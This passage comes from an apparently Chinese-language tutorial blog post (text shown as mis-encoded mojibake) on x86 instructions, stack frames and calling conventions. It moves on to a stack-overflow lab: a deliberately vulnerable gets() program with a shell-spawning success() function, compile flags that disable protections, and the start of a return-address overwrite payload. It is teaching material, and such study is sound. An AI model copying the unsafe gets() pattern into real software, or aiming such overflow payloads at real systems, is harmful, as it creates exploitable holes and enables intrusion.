SAR</h5><p>å³ç§»æŒ‡ä»¤</p><ul><li><p><strong>SHR</strong>ï¼ˆShift Logical Rightï¼‰ï¼šé€»è¾‘å³ç§»ï¼Œç©ºå‡ºçš„ä½ç”¨ 0 å¡«å……ã€‚</p></li><li><p><strong>SAR</strong>ï¼ˆShift Arithmetic Rightï¼‰ï¼šç®—æœ¯å³ç§»ï¼Œç¬¦å·ä½ä¿æŒä¸å˜ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHR AX, 1        ; å°† AX å³ç§» 1 ä½<br></code></pre></td></tr></table></figure><h4 id="3-2-6-å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤"><a href="#3-2-6-å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤" class="headerlink" title="3.2.6 å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤"></a>3.2.6 å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤</h4><h5 id="1-MOVSB-MOVSW-MOVSD"><a href="#1-MOVSB-MOVSW-MOVSD" class="headerlink" title="1. MOVSB &#x2F; MOVSW &#x2F; MOVSD"></a>1. MOVSB &#x2F; MOVSW &#x2F; MOVSD</h5><p>å­—ç¬¦ä¸²ç§»åŠ¨æŒ‡ä»¤</p><ul><li><p><strong>MOVSB</strong>ï¼šå­—èŠ‚ä¼ é€ã€‚</p></li><li><p><strong>MOVSW</strong>ï¼šå­—ä¼ é€ã€‚</p></li><li><p><strong>MOVSD</strong>ï¼šåŒå­—ä¼ é€ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOVSB            ; å°† DS:SI æŒ‡å‘çš„å­—èŠ‚ä¼ é€åˆ° ES:DI<br></code></pre></td></tr></table></figure><h5 id="2-REP"><a href="#2-REP" class="headerlink" title="2. REP"></a>2. REP</h5><p>é‡å¤å‰ç¼€æŒ‡ä»¤</p><p><code>REP</code> æŒ‡ä»¤ç”¨äºé‡å¤æ‰§è¡Œå­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤ï¼Œç›´åˆ° <code>CX</code> å¯„å­˜å™¨çš„å€¼ä¸º 0ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">REP MOVSB        ; é‡å¤æ‰§è¡Œ MOVSBï¼Œç›´åˆ° CX ä¸º 0<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒä¹¦ç±ä¸é“¾æ¥"><a href="#å‚è€ƒä¹¦ç±ä¸é“¾æ¥" class="headerlink" title="å‚è€ƒä¹¦ç±ä¸é“¾æ¥"></a>å‚è€ƒä¹¦ç±ä¸é“¾æ¥</h2><p><a href="https://cankaoshouce.com/assembly/assembly-course.html">æ±‡ç¼–è¯­è¨€ æ•™ç¨‹ | å‚è€ƒæ‰‹å†Œ (cankaoshouce.com)</a></p><p>æ±‡ç¼–è¯­è¨€ï¼ˆç¬¬4ç‰ˆï¼‰ (ç‹çˆ½)</p><h2 id="Helloï¼ŒWorldï¼"><a href="#Helloï¼ŒWorldï¼" class="headerlink" title="Helloï¼ŒWorldï¼"></a>Helloï¼ŒWorldï¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section    .text<br>   global _start     ;å¿…é¡»ä¸ºé“¾æ¥å™¨(ld)å£°æ˜<br>_start:                ;å‘Šè¯‰é“¾æ¥å™¨å…¥å£ç‚¹<br>   mov    edx,len     ;æ¶ˆæ¯é•¿åº¦<br>   mov    ecx,msg     ;å†™æ¶ˆæ¯<br>   mov    ebx,1       ;æ–‡ä»¶æè¿°ç¬¦ (stdout)<br>   mov    eax,4       ;ç³»ç»Ÿè°ƒç”¨å· (sys_write)<br>   int    0x80        ;è°ƒç”¨å†…æ ¸<br>   mov    eax,1       ;ç³»ç»Ÿè°ƒç”¨å· (sys_exit)<br>   int    0x80        ;è°ƒç”¨å†…æ ¸<br>section    .data<br>msg db &#x27;Hello, World!&#x27;, 0xa  ;è¦æ‰“å°çš„å­—ç¬¦ä¸²<br>len equ $ - msg     ;å­—ç¬¦ä¸²çš„é•¿åº¦<br></code></pre></td></tr></table></figure><h1 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h1><h2 id="1-æ ˆ"><a href="#1-æ ˆ" class="headerlink" title="1. æ ˆ"></a>1. æ ˆ</h2><p>æ ˆæ˜¯ä¸€ç§å…¸å‹çš„åè¿›å…ˆå‡º (Last in First Out) çš„æ•°æ®ç»“æ„ï¼Œå…¶æ“ä½œä¸»è¦æœ‰å‹æ ˆ (push) ä¸å‡ºæ ˆ (pop) ä¸¤ç§æ“ä½œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆç»´åŸºç™¾ç§‘ï¼‰ã€‚ä¸¤ç§æ“ä½œéƒ½æ“ä½œæ ˆé¡¶ï¼Œå½“ç„¶ï¼Œå®ƒä¹Ÿæœ‰æ ˆåº•ã€‚</p><img src="/post/47670/1729407589581-9bd3884f-fd93-40c9-9c1f-b128b9f3e8ce-1735222654797-156.png" class="" title="img"><p>é«˜çº§è¯­è¨€åœ¨è¿è¡Œæ—¶éƒ½ä¼šè¢«è½¬æ¢ä¸ºæ±‡ç¼–ç¨‹åºï¼Œåœ¨æ±‡ç¼–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå……åˆ†åˆ©ç”¨äº†è¿™ä¸€æ•°æ®ç»“æ„ã€‚æ¯ä¸ªç¨‹åºåœ¨è¿è¡Œæ—¶éƒ½æœ‰è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå…¶ä¸­æŸä¸€éƒ¨åˆ†å°±æ˜¯è¯¥ç¨‹åºå¯¹åº”çš„æ ˆï¼Œç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨ä¿¡æ¯å’Œå±€éƒ¨å˜é‡ã€‚æ­¤å¤–ï¼Œå¸¸è§çš„æ“ä½œä¹Ÿæ˜¯å‹æ ˆä¸å‡ºæ ˆã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>ç¨‹åºçš„æ ˆæ˜¯ä»è¿›ç¨‹åœ°å€ç©ºé—´çš„é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„</strong>ã€‚</p><h2 id="2-è°ƒç”¨æµç¨‹"><a href="#2-è°ƒç”¨æµç¨‹" class="headerlink" title="2. è°ƒç”¨æµç¨‹"></a>2. è°ƒç”¨æµç¨‹</h2><p>Cè¯­è¨€ä¾‹å­</p><p>mainå‡½æ•°è°ƒç”¨func_bå‡½æ•°ï¼Œfunc_bå‡½æ•°è°ƒç”¨func_aå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func_a</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//do sth</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">func_b</span><span class="hljs-params">()</span>&#123;<br>    func_a();<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    func_b();<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-è°ƒç”¨func-bå‡½æ•°"><a href="#2-1-è°ƒç”¨func-bå‡½æ•°" class="headerlink" title="2.1 è°ƒç”¨func_bå‡½æ•°"></a>2.1 è°ƒç”¨func_bå‡½æ•°</h3><p>â‘ å½“è¿è¡Œåˆ°call func_bæ—¶mainå‡½æ•°çš„æ ˆå¸§</p><p>â‘¡RBPæŒ‡å‘æ ˆåº•ï¼ŒRSPæŒ‡å‘æ ˆé¡¶</p><p>â‘¢è¿™æ®µæ ˆå¸§å­˜æ”¾äº†ä¸€äº›mainå‡½æ•°çš„å±€éƒ¨å˜é‡</p><p>â‘£mainå‡½æ•°è¦è°ƒç”¨func_bï¼Œmainåªéœ€è¦call func_b</p><p>â‘¤ä¹Ÿå°±æ˜¯</p><ul><li>push rip;</li><li>mov rip func_b;</li></ul><img src="/post/47670/1729407589643-4ff3aa18-9f1b-4c85-854a-89eb055f7528-1735222654797-157.png" class="" title="img"><p>â‘ é‚£ä¹ˆæ­¤æ—¶è·³è½¬åˆ°func_bç»§ç»­æ‰§è¡Œï¼Œfunc_bç›´æ¥æ‰§è¡Œä¸»é€»è¾‘å—ï¼Ÿ</p><p>â‘¡æ˜¾ç„¶ä¸æ˜¯çš„ï¼Œè¢«è°ƒç”¨å‡½æ•°func_bè¿˜éœ€è¦ç»´æŠ¤æ ˆå¸§ã€‚</p><p>â‘¢å…·ä½“æ¥è¯´ï¼Œéœ€è¦ä»¥ä¸‹å‡ æ­¥ï¼š</p><ul><li>push rbp;å°†è°ƒç”¨å‡½æ•°çš„æ ˆåº•æŒ‡é’ˆä¿å­˜ã€‚</li><li>mov rbp, rsp;å°†æ ˆåº•æŒ‡é’ˆæŒ‡å‘ç°åœ¨çš„æ ˆé¡¶ã€‚</li><li>sub rsp, xxx;å¼€è¾Ÿè¢«è°ƒç”¨å‡½æ•°æ ˆå¸§ï¼Œæ­¤æ—¶ä¸Šä¸€æ­¥çš„rbpå°±æ˜¯æŒ‡å‘æ ˆå¸§çš„åº•ã€‚</li></ul><h3 id="2-2-è°ƒç”¨func-bå‡½æ•°å®Œæˆ"><a href="#2-2-è°ƒç”¨func-bå‡½æ•°å®Œæˆ" class="headerlink" title="2.2 è°ƒç”¨func_bå‡½æ•°å®Œæˆ"></a>2.2 è°ƒç”¨func_bå‡½æ•°å®Œæˆ</h3><p>â‘ func_bæ‰§è¡Œå®Œç»´æŠ¤æ ˆå¸§æ“ä½œåçš„æ ˆå¸ƒå±€</p><p>â‘¡æ‰€è°“æ ˆå¸§çš„ç»´æŠ¤å°±æ˜¯ç»´æŠ¤rbpå’Œrspä¸¤ä¸ªæŒ‡é’ˆ</p><p>â‘¢rspæ°¸è¿œæŒ‡å‘æ ˆé¡¶</p><p>â‘£rbpç”¨æ¥å®šä½å±€éƒ¨å˜é‡</p><img src="/post/47670/1729407589709-319cb89a-4336-4d0d-9b38-52fc237732eb-1735222654797-158.png" class="" title="img"><h3 id="2-3-è°ƒç”¨func-aå‡½æ•°"><a href="#2-3-è°ƒç”¨func-aå‡½æ•°" class="headerlink" title="2.3 è°ƒç”¨func_aå‡½æ•°"></a>2.3 è°ƒç”¨func_aå‡½æ•°</h3><p>â‘ ç°åœ¨ï¼Œfunc_bå‡½æ•°è¦è°ƒç”¨func_aå‡½æ•°ï¼Œå…¶è°ƒç”¨æµç¨‹ä¸mainå‡½æ•°è°ƒç”¨func_bå‡½æ•°åŸºæœ¬ä¸€è‡´ã€‚</p><p>â‘¡ä¸åŒå¤„åœ¨äºè¿”å›åœ°å€ã€rbpå’ŒrspæŒ‡å‘çš„åœ°å€ï¼Œä»¥åŠå¼€è¾Ÿçš„æ ˆç©ºé—´çš„ä¸åŒã€‚</p><h3 id="2-4-è°ƒç”¨func-aå‡½æ•°å®Œæˆ"><a href="#2-4-è°ƒç”¨func-aå‡½æ•°å®Œæˆ" class="headerlink" title="2.4 è°ƒç”¨func_aå‡½æ•°å®Œæˆ"></a>2.4 è°ƒç”¨func_aå‡½æ•°å®Œæˆ</h3><p>â‘ func_bå‡½æ•°è°ƒç”¨å®Œfunc_aå‡½æ•°åçš„æ ˆå¸ƒå±€</p><p>â‘¡è‡³æ­¤ï¼Œç¤ºä¾‹çš„å‡½æ•°å·²ç»è°ƒç”¨å®Œæ¯•</p><img src="/post/47670/1729407589770-93d11168-b99e-4f54-8b27-3e004fbfb31a-1735222654797-159.png" class="" title="img"><p>â‘¢è‡³æ­¤ï¼Œç¤ºä¾‹çš„å‡½æ•°è°ƒç”¨å·²ç»å®Œæ¯•</p><p>â‘£ç°åœ¨ï¼Œfunc_aæ‰§è¡Œå®Œæ¯•ï¼Œè¦è¿”å›äº†</p><p>â‘¤è¯¥å¦‚ä½•ç»´æŠ¤æ ˆå¸§å‘¢ï¼Ÿ</p><h3 id="2-5-leaveæŒ‡ä»¤"><a href="#2-5-leaveæŒ‡ä»¤" class="headerlink" title="2.5 leaveæŒ‡ä»¤"></a>2.5 leaveæŒ‡ä»¤</h3><p>â‘ leaveæŒ‡ä»¤ä½œç”¨æ˜¯ç»´æŠ¤æ ˆå¸§ï¼Œé€šå¸¸å‡ºç°åœ¨å‡½æ•°çš„ç»“å°¾ï¼Œä¸retè¿ç”¨</p><p>â‘¡å…¶å®é™…ä½œç”¨ä¸º</p><ul><li>mov rsp, rbp;</li><li>pop rbp;</li></ul><p>â‘¢å°†æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘æ ˆå¸§åº•éƒ¨ï¼Œç„¶ååœ¨æ ˆä¸­å¼¹å‡ºæ–°çš„æ ˆåº•æŒ‡é’ˆ</p><h3 id="2-6-è¿”å›func-aå‡½æ•°"><a href="#2-6-è¿”å›func-aå‡½æ•°" class="headerlink" title="2.6 è¿”å›func_aå‡½æ•°"></a>2.6 è¿”å›func_aå‡½æ•°</h3><p>â‘ åœ¨ä¸€ä¸ªå‡½æ•°æ‰§è¡Œç»“æŸè¿”å›æ—¶ï¼Œä¼šæ‰§è¡Œleave; ret ;</p><p>â‘¡å®é™…æ•ˆæœå°±æ˜¯ï¼š</p><ul><li>mov rsp rbp; å°†æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘ç°åœ¨çš„æ ˆåº•</li><li>pop rbp; å°†ä¿å­˜çš„æ ˆåº•æŒ‡é’ˆå¼¹å‡º</li><li>pop rip;æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤</li></ul><p>â‘¢func_aå‡½æ•°æ‰§è¡Œå®Œæ¯•è¿”å›åï¼Œæ ˆå¸ƒå±€å¦‚å›¾ï¼š</p><img src="/post/47670/1729407589862-0fe2b72b-cabf-4b1a-8e64-d77023632cd5-1735222654797-160.png" class="" title="img"><p>â‘¢å¯ä»¥ä¸ä¹‹å‰func_bå‡½æ•°æœªè°ƒç”¨func_aå‡½æ•°å‰çš„æ ˆå¸§å¯¹æ¯”</p><p>â‘£ä¸€æ¨¡ä¸€æ ·ï¼Œè¯´æ˜å·²ç»æ¢å¤äº†æ ˆå¸§</p><p>â‘¤å”¯ä¸€ä¸åŒå¤„å°±åœ¨äºæ­¤ç¨‹åºçš„ripå·²ç»æŒ‡å‘äº†c&#x3D;1</p><h3 id="2-7-è¿”å›func-bå‡½æ•°"><a href="#2-7-è¿”å›func-bå‡½æ•°" class="headerlink" title="2.7 è¿”å›func_bå‡½æ•°"></a>2.7 è¿”å›func_bå‡½æ•°</h3><p>â‘ func_bå‡½æ•°æ‰§è¡Œå®Œæ¯•è¿”å›åï¼Œæ ˆå¸ƒå±€å¦‚å›¾ï¼š</p><img src="/post/47670/1729407589926-dcee0fed-773c-491e-b301-aee4d9265abe-1735222654797-161.png" class="" title="img"><p>åœ¨è¿™ä¹‹åï¼Œmainå‡½æ•°ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°ç»“æŸã€‚</p><h3 id="2-8å‡½æ•°è°ƒç”¨æµç¨‹æ€»ç»“"><a href="#2-8å‡½æ•°è°ƒç”¨æµç¨‹æ€»ç»“" class="headerlink" title="2.8å‡½æ•°è°ƒç”¨æµç¨‹æ€»ç»“"></a>2.8å‡½æ•°è°ƒç”¨æµç¨‹æ€»ç»“</h3><p>â‘ è°ƒç”¨å‡½æ•°ï¼šåªéœ€è¦å°†ripå‹æ ˆï¼Œå³push ripï¼Œç„¶åå°†ripèµ‹å€¼ä¸ºè¢«è°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè¿™å·²æ“ä½œè¢«éšæ€§çš„å†…ç½®åœ¨callæŒ‡ä»¤ä¸­ã€‚</p><p>â‘¡è¢«è°ƒç”¨å‡½æ•°ï¼špush rbp; mov rbp rsp; sub rsp xxxã€‚</p><p>å³ä¿å­˜è°ƒç”¨å‡½æ•°çš„rbpæŒ‡é’ˆï¼Œå°†è‡ªå·±çš„rbpæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç„¶åå¼€è¾Ÿæ ˆç©ºé—´ç»™è‡ªå·±ç”¨ï¼Œæ­¤æ—¶å°±å˜æˆäº†è¢«è°ƒç”¨å‡½æ•°çš„æ ˆåº•ã€‚</p><p>â‘¢å‡½æ•°è¿”å›ï¼šleave; ret; ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šmov rsp rbp; pop rbp; pop rip; å³æ¢å¤æ ˆå¸§ï¼Œè¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p><h2 id="3-è°ƒç”¨çº¦å®š"><a href="#3-è°ƒç”¨çº¦å®š" class="headerlink" title="3. è°ƒç”¨çº¦å®š"></a>3. è°ƒç”¨çº¦å®š</h2><p>å‡½æ•°è¿”å›å€¼çº¦å®š</p><ul><li>ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ä¼šå­˜å‚¨åˆ°RAXå¯„å­˜å™¨</li></ul><p>32ä½å’Œ64ä½ç¨‹åºå‚æ•°è°ƒç”¨çº¦å®š</p><ul><li><p>x86</p></li><li><p><strong>å‡½æ•°å‚æ•°</strong>åœ¨<strong>å‡½æ•°è¿”å›åœ°å€</strong>çš„ä¸Šæ–¹</p></li><li><p>x64</p></li><li><p>System V AMD64 ABI (Linuxã€FreeBSDã€macOS ç­‰é‡‡ç”¨) ä¸­å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ <strong>RDI, RSI, RDX, RCX, R8 å’Œ R9 å¯„å­˜å™¨</strong>ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚</p></li><li><p>å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ<strong>6 ä¸ªå­—èŠ‚é•¿åº¦</strong>ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p></li></ul><h1 id="æ ˆæº¢å‡ºåŸç†"><a href="#æ ˆæº¢å‡ºåŸç†" class="headerlink" title="æ ˆæº¢å‡ºåŸç†"></a>æ ˆæº¢å‡ºåŸç†</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Linux ç¯å¢ƒä¸­ï¼ŒäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶çš„ç±»å‹æ˜¯ï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶ã€‚</p><p>ELF æ–‡ä»¶ä¸­åŒ…å«è®¸å¤šä¸ªèŠ‚(section)ï¼Œå„ä¸ªèŠ‚ä¸­å­˜æ”¾ä¸åŒçš„æ•°æ®ï¼Œè¿™äº›èŠ‚çš„ä¿¡æ¯å­˜æ”¾åœ¨èŠ‚å¤´è¡¨ä¸­ï¼Œä¸»è¦åŒ…æ‹¬</p><img src="/post/47670/1729742376286-84aedbcd-5134-4fb1-9cdf-730607cd8fbc-1735222654797-162.png" class="" title="img"><p>åœ¨ ida ä¸­æŒ‰ä¸‹ Ctrl+sï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªèŠ‚çš„ä¿¡æ¯</p><img src="/post/47670/1729742504846-f542b168-5048-4b5d-82b9-68bab938b6a6-1735222654797-163.png" class="" title="img"><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯ï¼š</p><ul><li>ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚</li><li>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚</li></ul><p>æœ€å…¸å‹çš„æ ˆæº¢å‡ºåˆ©ç”¨æ˜¯è¦†ç›–ç¨‹åºçš„è¿”å›åœ°å€ä¸ºæ”»å‡»è€…æ‰€æ§åˆ¶çš„åœ°å€ï¼Œ<strong>å½“ç„¶éœ€è¦ç¡®ä¿è¿™ä¸ªåœ°å€æ‰€åœ¨çš„æ®µå…·æœ‰å¯æ‰§è¡Œæƒé™</strong>ã€‚</p><h3 id="32-ä½ç¨‹åº"><a href="#32-ä½ç¨‹åº" class="headerlink" title="32 ä½ç¨‹åº"></a>32 ä½ç¨‹åº</h3><p>ä¸¾ä¸ªCè¯­è¨€ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Hava already controlled it.&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br>    gets(s);<br>    <span class="hljs-built_in">puts</span>(s);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    vulnerable();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºçš„ä¸»è¦ç›®çš„è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¾“å‡ºã€‚ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºmainå‡½æ•°è°ƒç”¨äº†vulnerableå‡½æ•°ï¼Œä½†mainå‡½æ•°å’Œvulnerableå‡½æ•°éƒ½æ²¡æœ‰è°ƒç”¨successå‡½æ•°ï¼Œ<strong>æˆ‘ä»¬å‡è®¾successå‡½æ•°ä¸­putsè¯­å¥è¾“å‡ºçš„å†…å®¹å³ä¸ºæˆ‘ä»¬çš„flagï¼Œé‚£æˆ‘ä»¬å°±å¸Œæœ›è·å¾—succeså‡½æ•°ä¸­çš„flag</strong>ï¼Œåº”è¯¥æ€æ ·è·å–flagå‘¢ï¼Œè¯·å¾€ä¸‹çœ‹</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -fno-stack-protector -no-pie pwn.c -o pwn32<br></code></pre></td></tr></table></figure><img src="/post/47670/1729694599728-2e9a39e0-ea9a-4ee2-8320-b11b28f673e6-1735222654797-164.png" class="" title="img"><p>å¯ä»¥çœ‹å‡º gets æœ¬èº«æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ã€‚å®ƒä»ä¸æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œæ˜¯ä»¥å›è½¦æ¥åˆ¤æ–­è¾“å…¥æ˜¯å¦ç»“æŸï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¯ä»¥å¯¼è‡´æ ˆæº¢å‡º</p><p>gcc ç¼–è¯‘æŒ‡ä»¤ä¸­ï¼Œ-m32 æŒ‡çš„æ˜¯ç”Ÿæˆ 32 ä½ç¨‹åºï¼› -fno-stack-protector æŒ‡çš„æ˜¯ä¸å¼€å¯å †æ ˆæº¢å‡ºä¿æŠ¤ï¼Œå³ä¸ç”Ÿæˆ canaryã€‚ ä¸ºäº†æ›´åŠ æ–¹ä¾¿åœ°ä»‹ç»æ ˆæº¢å‡ºçš„åŸºæœ¬åˆ©ç”¨æ–¹å¼ï¼Œä½¿ç”¨-no-pieå…³é—­ PIEï¼ˆPosition Independent Executableï¼‰ï¼Œé¿å…åŠ è½½åŸºå€è¢«æ‰“ä¹±ã€‚</p><p>ç¼–è¯‘æˆåŠŸåï¼Œå¯ä»¥ä½¿ç”¨checksecæ£€æŸ¥ç¼–è¯‘çš„æ–‡ä»¶</p><img src="/post/47670/1729694627992-6d9f5b2d-57fe-49e8-80ea-eab44841016d-1735222654797-165.png" class="" title="img"><p>ç¡®è®¤æ ˆæº¢å‡ºå’Œ PIE ä¿æŠ¤å…³é—­åï¼Œæˆ‘ä»¬åˆ©ç”¨ IDA æ¥åç¼–è¯‘ä¸€ä¸‹äºŒè¿›åˆ¶ç¨‹åºå¹¶æŸ¥çœ‹vulnerable å‡½æ•°</p><img src="/post/47670/1729415597376-9ecc28cc-bd2b-4b61-b496-3a4ef0f2eb01-1735222654797-166.png" class="" title="img"><p>è¯¥å­—ç¬¦ä¸²è·ç¦» ebp çš„é•¿åº¦ä¸º 0x14ï¼Œé‚£ä¹ˆç›¸åº”çš„æ ˆç»“æ„ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">             +-----------------+<br>             |     retaddr     |<br>             +-----------------+<br>             |     saved ebp   |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>å¹¶ä¸”ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ IDA è·å¾— success çš„åœ°å€ï¼Œå…¶åœ°å€ä¸º0x8049196</p><img src="/post/47670/1729694734686-0ee2abaf-3c57-4427-86e4-95672dad4fe2-1735222654797-167.png" class="" title="img"><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¯»å–çš„å­—ç¬¦ä¸²ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span> + success_addr<br><span 